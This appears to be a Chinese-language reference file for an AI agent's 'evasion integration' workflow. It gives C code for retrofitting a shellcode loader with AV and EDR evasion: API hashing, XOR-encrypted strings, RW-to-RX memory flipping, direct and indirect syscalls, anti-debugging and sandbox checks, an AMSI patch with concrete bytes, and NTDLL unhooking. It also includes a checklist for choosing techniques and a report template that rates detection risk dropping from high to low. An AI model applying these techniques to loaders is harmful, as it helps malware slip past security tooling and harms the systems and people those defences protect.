# 免杀技术整合模式参考

> 提取自 Evasion-SubAgents/evasion_integrate.md，供 [references/integration-patterns.md](references/integration-patterns.md) 引用。

## 整合模式代码示例

### 1. API Hashing（API 混淆）

```c
// Before: 明文 API 调用
HMODULE hNtdll = LoadLibraryA("ntdll.dll");
LPVOID func = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

// After: Hash 查找
DWORD hash = 0xDEADBEEF; // 预计算的 API hash
LPVOID func = GetAPIByHash(hash);
```

**实现要点**：
- 预计算所有目标 API 的 hash
- 实现 PEB 遍历 + hash 比对函数
- 支持 djb2 / ror13 / crc32 等算法

### 2. String XOR（字符串加密）

```c
// Before: 明文字符串
char* dllName = "kernel32.dll";

// After: XOR 加密
char dllName[] = { 0x1a, 0x14, 0x07, 0x1b, 0x14, 0x19, ... };
void xor_decrypt(char* data, size_t len) {
    for (size_t i = 0; i < len; i++) data[i] ^= KEY;
}
xor_decrypt(dllName, sizeof(dllName));
```

**实现要点**：
- 搜索所有硬编码字符串（grep/strings）
- 选择随机 XOR key
- 加密后放入 char array
- 运行时解密使用

### 3. 权限翻转（Memory Evasion）

```c
// Before: RWX 一步到位（高风险）
LPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// After: RW → 写入 → RX（低风险）
LPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
memcpy(addr, shellcode, size);
DWORD oldProtect;
VirtualProtect(addr, size, PAGE_EXECUTE_READ, &oldProtect);
```

### 4. Syscall 替换（Execution Evasion）

```c
// Before: 标准 API 调用（可被 Hook 拦截）
NtAllocateVirtualMemory(...);

// After: 直接系统调用
DWORD ssn = GetSSN("NtAllocateVirtualMemory");
ExecuteSyscall(ssn, ...);
```

**实现方式**：
- **直接 Syscall**: 读取 ntdll.dll 获取 SSN，内联汇编调用
- **间接 Syscall**: 跳转到 ntdll.dll 中原始 syscall 指令地址

### 5. 反调试（Anti-Analysis）

```c
// 方法1: IsDebuggerPresent
if (IsDebuggerPresent()) ExitProcess(0);

// 方法2: 时间差检测
LARGE_INTEGER t1, t2, freq;
QueryPerformanceCounter(&t1);
// ... some work ...
QueryPerformanceCounter(&t2);
if ((t2.QuadPart - t1.QuadPart) / freq.QuadPart > threshold) ExitProcess(0);

// 方法3: CPU 核心数（沙箱通常只有 1-2 核）
SYSTEM_INFO si;
GetSystemInfo(&si);
if (si.dwNumberOfProcessors < 2) ExitProcess(0);
```

### 6. AMSI/ETW Bypass

```c
// AMSI Patch: AmsiScanBuffer 返回 S_OK
HMODULE hAmsi = LoadLibraryA("amsi.dll");
LPVOID pFunc = GetProcAddress(hAmsi, "AmsiScanBuffer");
DWORD oldProtect;
VirtualProtect(pFunc, 6, PAGE_READWRITE, &oldProtect);
memcpy(pFunc, "\xb8\x57\x00\x07\x80\xc3", 6); // mov eax, 0x80070057; ret
VirtualProtect(pFunc, 6, oldProtect, &oldProtect);
```

### 7. NTDLL Unhooking

```c
// 从磁盘重新映射干净的 ntdll.dll
HANDLE hFile = CreateFileW(L"\\??\\C:\\Windows\\System32\\ntdll.dll", ...);
HANDLE hSection = NULL;
NtCreateSection(&hSection, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
LPVOID cleanNtdll = NULL;
NtMapViewOfSection(hSection, GetCurrentProcess(), &cleanNtdll, ...);
// 用干净副本覆盖 .text section
```

---

## 兼容性检查清单

整合前必须确认：

| 检查项 | 操作 |
|--------|------|
| Loader 使用 RWX？ | 是 → 加权限翻转 |
| 有明文 DLL/API 名？ | 是 → 加 API Hashing + 字符串 XOR |
| 使用标准 Win API？ | 是 → 考虑 Syscall 替换 |
| 无反调试？ | 是 → 加 Anti-Analysis |
| 目标有 AMSI？ | 是 → 加 AMSI Bypass |
| 目标 DLL 可能被 Hook？ | 是 → 加 NTDLL Unhooking |

## 变更报告模板

```markdown
## 免杀整合报告

- **原始文件**: loader.c
- **应用技术**: [API Hashing, String XOR, 权限翻转]
- **修改的 API**: LoadLibraryA → Hash 查找, GetProcAddress → Hash 查找
- **修改的字符串**: 3 个 DLL 名, 2 个 API 名
- **检测风险变化**: 高 → 低
- **编译结果**: ✅ 通过
```
